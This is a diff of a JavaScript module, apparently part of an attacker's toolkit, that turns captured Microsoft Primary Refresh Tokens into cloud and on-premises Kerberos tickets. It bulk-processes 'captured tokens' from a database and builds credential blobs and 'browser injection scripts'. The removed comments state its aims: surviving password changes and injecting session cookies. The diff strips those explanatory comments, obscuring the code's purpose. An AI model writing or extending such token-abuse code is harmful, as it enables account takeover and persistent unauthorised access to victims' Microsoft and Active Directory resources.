@@ -1,12 +1,3 @@
-/**
- * VGenius Kerberos TGT Derivation Service
- * Derives cloud and AD Kerberos tickets from PRT via autologon.microsoftazuread-sso.com
- * 
- * This enables true password-change survival by obtaining device-bound Kerberos tickets
- * that persist independently of password changes.
- * 
- * Pipeline: PRT -> autologon SSO -> TGT Cloud + TGT AD + Session Key
- */
 'use strict';
 
 const axios = require('axios');
@@ -16,14 +7,6 @@ const db = require('../database/connection');
 const config = require('../config/env');
 const { buildClientAssertion, getPrtCookie } = require('./devicemanager');
 
-/**
- * Safely decode the JWT payload of a PRT without verifying the signature.
- * PRTs are JWTs; the payload is base64url(JSON).
- * Returns the claims object, or null if the PRT cannot be parsed.
- *
- * Also handles v2 refresh tokens (e.g. "1.AVsATAj-tn...") which are opaque
- * and cannot be decoded — returns null for those so callers know it's not a JWT.
- */
 function parsePrtClaims(prt) {
   if (!prt || typeof prt !== 'string') return null;
   // Strip PRT:<> wrapping if present
@@ -32,9 +15,6 @@ function parsePrtClaims(prt) {
     raw = raw.slice('PRT:<'.length);
     // AAD sometimes wraps in the token format 'PRT:<token>' and there may be more
   }
-  // A PRT can be either a single JWT (3 dot-separated segments)
-  // or a wrapped credential blob starting with "1." (AAD refresh token v2 format)
-  // v2 tokens are opaque — cannot decode, return null
   if (raw.startsWith('1.')) {
     return null;
   }
@@ -62,13 +42,6 @@ function isValidPrtJwt(prt) {
 }
 
 /**
- * Validate whether a PRT is actually eligible for Kerberos/SSO derivation.
- *
- * The autologon endpoint returns 404 (empty body) when the PRT is missing
- * the `acrs` array or when it does not include the `pfdr` (Personal Flow
- * Device Registration) claim that Azure AD grants only for PRTs issued
- * through the DRS device-registration flow.
- *
  * @returns {{ok: boolean, reason?: string, claims?: object}}
  */
 function validatePrtForKerberos(prt, tenant) {
@@ -130,10 +103,6 @@ async function deriveKerberosTGTs(prt, refreshToken, tenant, clientId, sessionKe
     return results;
   }
 
-  // Pre-flight check: verify the PRT is eligible for SSO before spending an HTTP round-trip.
-  // Without this, the autologon endpoint returns a bare 404 with an empty body
-  // whenever the PRT lacks acrs=pfdr — which is the common cause of the cryptic
-  // "Cloud TGT request failed: HTTP 404 - """ log line.
   const prtCheck = validatePrtForKerberos(prt, tenant);
   if (!prtCheck.ok) {
     results.error = 'PRT not eligible for Kerberos derivation: ' + prtCheck.reason;
@@ -160,11 +129,6 @@ async function deriveKerberosTGTs(prt, refreshToken, tenant, clientId, sessionKe
 }
 
 /**
- * Derive Cloud Kerberos TGT
- * 
- * Hitting the Azure AD SSO endpoint with the PRT as a bearer token.
- * Returns the cloud TGT encrypted with the session key.
- * 
  * @param {string} prt - Primary Refresh Token
  * @param {string} tenant - Tenant ID
  * @param {string} clientId - Client ID
@@ -178,8 +142,6 @@ async function deriveCloudTGT(prt, tenant, clientId) {
     tgt_cloud_sessionkey: null
   };
 
-  // The PRT must be in the x-ms-RefreshTokenCredential cookie format
-  // We send it as a Bearer token in the Authorization header
   const authHeader = 'PRT:<' + prt;
 
   try {
@@ -200,9 +162,6 @@ async function deriveCloudTGT(prt, tenant, clientId) {
     );
 
     if (response1.status !== 200) {
-      // Map each status to a specific, actionable message so logs are readable.
-      // 404 with empty body is the classic "PRT not eligible for SSO" signature
-      // (missing acrs=pfdr or tenant mismatch).
       let detail;
       switch (response1.status) {
         case 401:
@@ -270,10 +229,6 @@ async function deriveCloudTGT(prt, tenant, clientId) {
 }
 
 /**
- * Derive AD (On-Premises) Kerberos TGT
- * 
- * Uses the PRT + session key to derive the AD Kerberos ticket for on-premises resource access.
- * 
  * @param {string} prt - Primary Refresh Token
  * @param {string} tenant - Tenant ID
  * @param {string} sessionKey - Decrypted session key
@@ -333,11 +288,6 @@ async function deriveADTGT(prt, tenant, sessionKey) {
 }
 
 /**
- * Bulk derive TGTs for all captured tokens that have PRT but no TGTs
- * 
- * Scans the database for tokens with PRT but missing TGT data,
- * then derives the missing Kerberos tickets.
- * 
  * @param {number} limit - Maximum number of tokens to process
  * @returns {object} { processed, success, failed, skipped }
  */
@@ -587,11 +537,6 @@ async function deriveTGTForToken(tokenId) {
 }
 
 /**
- * Get the full PRT credential blob for cookie injection
- * 
- * Combines PRT + session key + TGTs into the complete credential set
- * needed for browser cookie injection.
- * 
  * @param {string} tokenId - Token ID to get credentials for
  * @returns {object} Complete credential blob for injection
  */
@@ -635,8 +580,6 @@ async function getFullPRTCredentialBlob(tokenId) {
 }
 
 /**
- * Generate browser injection scripts from PRT credential blob
- * 
  * @param {object} blob - Credential blob
  * @returns {object} Various injection script formats
  */
